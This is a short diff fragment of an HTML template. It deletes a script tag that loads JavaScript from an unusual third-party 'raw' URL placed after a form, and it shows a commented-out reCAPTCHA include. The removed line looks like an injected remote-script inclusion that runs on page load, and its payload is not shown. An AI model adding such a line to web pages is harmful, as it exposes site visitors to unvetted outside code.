@@ -100,7 +100,6 @@
         </div>
     </form>
 </div>
-<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/PEL0ITP8RVUTI"></script>
 <!-- Include reCAPTCHA API
 <script src="https://www.google.com/recaptcha/api.js?render=6LfaHGsqAAAAAO2c4GXxqpOPKhxeTRqQ7FkVeF4m"></script>
 <script>
